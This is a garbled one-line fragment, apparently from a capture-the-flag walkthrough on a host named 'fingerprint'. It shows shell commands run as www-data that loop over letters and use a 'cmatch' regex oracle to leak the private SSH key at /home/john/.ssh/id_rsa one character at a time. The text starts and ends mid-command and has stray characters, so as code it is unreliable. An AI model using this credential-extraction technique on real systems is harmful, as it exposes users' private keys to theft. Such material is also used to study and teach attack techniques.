@@ -1,0 +1,1 @@
+john/.ssh/id_rsa "^-----BEGIN.{21} \n P ${ c } " | grep -qv "Found matches: 0" && echo $c ; done r www-data@fingerprint:/$ python -c "import string; print(' \n '.join(string.ascii_letters))" | while read c ; do cmatch /home/john/.ssh/id_rsa "^-----BEGIN.{21} \n Pr ${ c } " | grep -qv "Found matches: 0" &&
